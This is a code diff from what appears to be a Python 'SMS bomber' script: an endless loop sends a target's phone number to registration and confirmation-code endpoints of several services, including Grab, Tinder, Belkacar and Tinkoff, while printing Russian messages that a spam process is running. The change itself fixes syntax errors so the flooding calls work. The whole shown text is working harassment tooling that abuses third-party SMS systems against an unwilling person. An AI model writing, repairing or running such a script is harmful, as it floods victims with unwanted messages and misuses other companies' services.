@@ -38,9 +38,9 @@ while True:
 	requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
 	requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
 	print('\033[FИдет процесс спама /           ')
-	requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={}')
+	requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
 	print('\033[FИдет процесс спама ——           ')
-	requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={}')
+	requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
 	print('\033[FИдет процесс спама \           ')
 	requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
 	requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
